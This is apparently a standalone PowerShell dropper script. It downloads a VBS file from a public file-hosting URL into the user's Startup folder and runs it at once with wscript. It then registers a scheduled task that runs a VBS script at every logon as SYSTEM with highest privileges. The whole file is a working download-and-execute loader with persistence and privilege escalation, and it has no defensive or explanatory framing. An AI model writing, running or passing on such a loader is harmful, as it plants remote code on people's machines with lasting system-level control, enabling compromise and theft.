# Define URL of the VBS file
$url = "https://files.catbox.moe/eqlsi1.vbs"

# Build the full path to the user's Startup folder
$startupFolder = Join-Path $env:APPDATA "Microsoft\Windows\Start Menu\Programs\Startup"
$startupPath = Join-Path $startupFolder "eqlsi1.vbs"

# Create the Startup folder if it doesn't exist
if (-not (Test-Path $startupFolder)) {
    New-Item -ItemType Directory -Path $startupFolder | Out-Null
}

# Download the VBS file to the startup folder
Invoke-WebRequest -Uri $url -OutFile $startupPath

# Optionally run it immediately (in background)
Start-Process -FilePath "wscript.exe" -ArgumentList "`"$startupPath`"" -NoNewWindow

# Define the full path to the script in the Startup folder
$startupFolder = Join-Path $env:APPDATA "Microsoft\Windows\Start Menu\Programs\Startup"
$scriptPath = Join-Path $startupFolder "test.vbs"

# Define the action: run wscript.exe with the script path
$action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$scriptPath`""

# Define the trigger: at user logon
$trigger = New-ScheduledTaskTrigger -AtLogOn

# Define the principal: SYSTEM account with highest privileges
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest

# Optional task settings
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable

# Register the scheduled task
Register-ScheduledTask -TaskName "RunVbsAtLogon" -Action $action -Trigger $trigger -Principal $principal -Settings $settings

